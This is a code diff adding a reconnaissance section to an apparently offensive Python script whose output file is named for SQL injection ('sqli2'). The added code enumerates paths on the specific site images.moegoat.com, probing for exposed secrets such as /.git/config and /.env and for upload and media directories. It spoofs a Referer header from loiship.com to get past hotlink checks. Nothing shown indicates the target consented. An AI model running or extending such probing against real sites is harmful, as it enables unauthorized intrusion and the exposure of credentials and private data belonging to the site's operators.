@@ -182,6 +182,57 @@ for method, path in anon_tests:
     log("anon %s: %s %s" % (path[:45], st, b[:80].replace("\n", " ")))
     time.sleep(0.4)
 
+# 5. images.moegoat.com 路径枚举
+log("=== images 枚举 ===")
+img_paths = [
+    "/",
+    "/robots.txt",
+    "/.git/config",
+    "/.env",
+    "/upload/",
+    "/uploads/",
+    "/video/",
+    "/videos/",
+    "/media/",
+    "/storage/",
+    "/files/",
+    "/download/",
+    "/img/",
+    "/images/",
+    "/video/1.mp4",
+    "/videos/1.mp4",
+    "/list",
+    "/index.json",
+]
+for pp in img_paths:
+    url = "https://images.moegoat.com" + pp
+    try:
+        rq = urllib.request.Request(
+            url, headers={"User-Agent": UA, "Referer": "https://loiship.com/"}
+        )
+        resp = urllib.request.urlopen(
+            rq, timeout=10, context=ssl.create_default_context()
+        )
+        data = resp.read(64)
+        res.append({"t": "img-" + pp, "s": resp.status, "b": data[:40].hex()})
+        log("img %s: %s %s" % (pp, resp.status, data[:8].hex()))
+    except urllib.error.HTTPError as e:
+        res.append({"t": "img-" + pp, "s": e.code, "b": ""})
+        log("img %s: %s" % (pp, e.code))
+    except Exception as e:
+        res.append({"t": "img-" + pp, "s": "EXC", "b": type(e).__name__})
+        log("img %s: EXC %s" % (pp, type(e).__name__))
+    time.sleep(0.3)
+try:
+    url = "https://images.moegoat.com/HffjWfqcYwQMXlWaFidl3BkFPVwO3TS6pfadK6ST.jpg"
+    rq = urllib.request.Request(url, headers={"User-Agent": UA})
+    resp = urllib.request.urlopen(rq, timeout=10, context=ssl.create_default_context())
+    res.append({"t": "img-noref", "s": resp.status, "b": ""})
+    log("img noreferer: %s" % resp.status)
+except urllib.error.HTTPError as e:
+    res.append({"t": "img-noref", "s": e.code, "b": ""})
+    log("img noreferer: %s" % e.code)
+
 with open("sqli2_%d.jsonl" % shard, "w", encoding="utf-8") as f:
     for r in res:
         f.write(json.dumps(r, ensure_ascii=False) + "\n")
